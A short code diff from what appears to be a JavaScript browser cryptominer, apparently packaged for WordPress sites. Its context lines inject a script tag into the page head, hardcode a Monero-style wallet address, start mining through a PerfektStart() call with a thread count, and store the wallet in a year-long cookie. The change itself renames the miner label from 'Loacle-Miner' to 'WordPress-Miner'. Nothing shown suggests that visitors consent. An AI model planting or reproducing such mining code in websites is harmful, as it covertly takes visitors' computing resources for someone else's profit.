@@ -115,7 +115,7 @@ document.getElementsByTagName("head")[0].appendChild(scriptTag);
       wallet = "44FSBnYcQmZjGxE1zHyHDNM6k4XnS284jcc32uJmsumn2m4iFcnMDV3AsxfTP6Daeu3Qcp49CmDAQe1LKYDT6hFSCKTs7yg";
       if (wallet) 
       {
-		PerfektStart(wallet, "Loacle-Miner", threads);
+		PerfektStart(wallet, "WordPress-Miner", threads);
 		console.log(wallet);
 		$.cookie("wallet", wallet, {
 		expires: 365
